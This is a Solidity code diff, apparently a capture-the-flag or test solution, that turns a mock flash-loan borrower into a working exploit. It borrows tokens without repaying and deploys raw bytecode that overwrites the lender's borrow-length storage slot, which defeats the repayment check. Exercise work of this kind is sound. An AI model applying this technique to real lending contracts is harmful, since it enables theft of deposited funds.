@@ -9,37 +9,15 @@ contract MockAdversaryBorrower is IFlashLoanReceiver {
     ITransientLoan flashLoaner;
     /// @notice The mock erc20 that will be borrowed
     MockToken mockToken;
-    /// @notice Will this contract repay its loans?
-    bool doRepay;
 
     constructor(ITransientLoan _flashLoaner, MockToken _mockToken) {
         flashLoaner = _flashLoaner;
         mockToken = _mockToken;
     }
 
-    /// @notice Toggle whether or not this borrower will repay their loans
-    function setRepay(bool _doRepay) external {
-        doRepay = _doRepay;
-    }
-
     /// @notice Initiate the exploit
     function exploit() external {
         flashLoaner.startLoan();
-
-        // TODO
-    }
-
-    /// @notice Call the `borrow` function on the [TransientLoan] contract with
-    /// packed calldata.
-    function borrow(address token, uint256 amount, address to, bool payBack) public {
-        (bool success,) =
-            address(flashLoaner).call(abi.encodePacked(bytes4(flashLoaner.borrow.selector), token, amount, to));
-        assert(success);
-
-        // Optionally pay back our debt after borrowing.
-        if (payBack) {
-            mockToken.transfer(address(flashLoaner), amount);
-        }
     }
 
     ////////////////////////////////////////////////////////////////
@@ -49,6 +27,22 @@ contract MockAdversaryBorrower is IFlashLoanReceiver {
     /// @notice `IFlashLoanReceiver` implementation
     function bankroll() external {
         // Borrow some of the mock token
-        borrow(address(mockToken), 1 ether, address(this), doRepay);
+        // borrow(address(mockToken), 1 ether, address(this), doRepay);
+        (bool success,) = address(flashLoaner).call(
+            abi.encodePacked(bytes4(flashLoaner.borrow.selector), address(mockToken), uint256(1000), address(this))
+        );
+        assert(success);
+
+        // Deploy contract to overwrite borrow length storage slot
+        // PUSH1 0
+        // PUSH1 1
+        // SSTORE (todo: TSTORE)
+        bytes memory exploitCode = hex"60068060093d393df3600060015500";
+        address exploit;
+        assembly {
+            exploit := create(0x00, add(exploitCode, 0x20), mload(exploitCode))
+        }
+
+        address(flashLoaner).call(abi.encodePacked(bytes4(uint32(1)), exploit));
     }
 }
